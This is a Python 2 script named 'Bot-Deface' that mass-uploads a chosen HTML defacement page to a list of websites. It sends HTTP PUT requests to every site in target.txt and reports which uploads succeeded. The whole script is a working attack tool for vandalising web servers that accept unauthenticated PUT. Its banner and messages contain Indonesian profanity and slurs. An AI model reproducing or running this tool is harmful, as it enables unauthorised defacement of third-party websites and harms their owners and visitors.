try:
    import requests, os.path, sys
except ImportError:
    exit('Install Requests nya tolol....')

banner = '\n / \\ / \\ / \\    / \\ / \\ / \\ / \\ / \\ / \\  \n( B | o | t )  ( D | e | f | a | c | e ) \n \\_/ \\_/ \\_/    \\_/ \\_/ \\_/ \\_/ \\_/ \\_/  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~ Author : Mr.TenAr                      ~\n~ Yang Recode Anak Haram Tai Babi        ~\n~ Date   : 2019-09-23                    ~\n~ Tools  : Bot-Deface                    ~\n~ Github : /Aryaalfahrezi010             ~\n~ youtube: Dark Clown Security           ~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
b = '\x1b[31m'
h = '\x1b[32m'
m = '\x1b[00m'

def x(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)
    return str(ipt)


def aox(script, target_file='target.txt'):
    op = open(script, 'r').read()
    with open(target_file, 'r') as (target):
        target = target.readlines()
        s = requests.Session()
        print 'Lagi Upload File Lu Bngsd ke %d Web Target' % len(target)
        for web in target:
            try:
                site = web.strip()
                if site.startswith('http://') is False:
                    site = 'http://' + site
                req = s.put(site + '/' + script, data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print m + '[' + b + ' GABISA JANGAN NANGIS' + m + ' ] %s/%s' % (site, script)
                else:
                    print m + '[' + h + ' SUKSES NIH SAD' + m + ' ] %s/%s' % (site, script)
            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print
                exit()


def main(__bn__):
    print __bn__
    while True:
        try:
            a = x('Masukin Nama Script Deface Lu<ektensi .html jangan kau upload .php bego>: ')
            if not os.path.isfile(a):
                print "file '%s' Gaada bangsad" % a
                continue
            else:
                break
        except KeyboardInterrupt:
            print
            exit()

    aox(a)


if __name__ == '__main__':
    main(banner)
